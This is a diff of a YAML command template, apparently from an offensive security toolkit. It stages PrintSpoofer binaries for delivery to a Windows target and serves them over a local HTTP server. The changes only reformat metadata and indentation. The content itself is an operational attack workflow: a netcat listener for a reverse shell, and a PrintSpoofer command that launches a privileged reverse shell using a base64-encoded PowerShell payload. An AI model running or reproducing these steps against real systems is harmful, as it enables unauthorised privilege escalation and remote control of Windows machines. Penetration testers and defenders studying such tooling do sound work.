@@ -1,10 +1,10 @@
+---
 metadata:
-  filename: deliver-windows-PrintSpoofer.yaml
-  tags:
-  - windows
-  - privesc
-  created: '2025-03-29'
-  author: Unknown
+  filename: "deliver-windows-PrintSpoofer.yaml"
+  tags: ["windows", "privesc"]
+  created: "2025-03-29"
+  author: "Unknown"
+
 content: |
   mkdir -p packstation/outbound; cp -n {{ tools_dir }}/printspoofer/* packstation/outbound/; \
   echo '================================================================'; \
@@ -17,4 +17,4 @@ content: |
   echo 'Preparation 1 (for revshell): nc -lvnp {{ shell_port }}'; \
   echo 'To open another revshell with elevated privileges: {{ delivery_path_windows }}\PrintSpoofer64.exe -i -c "{{ payload | default(include('payloads/revshell-windows-powershell-oneliner-base64encoded.yaml')) }}"'; \
   echo '================================================================'; \
-   python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port }} -d packstation/outbound
+  python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port }} -d packstation/outbound
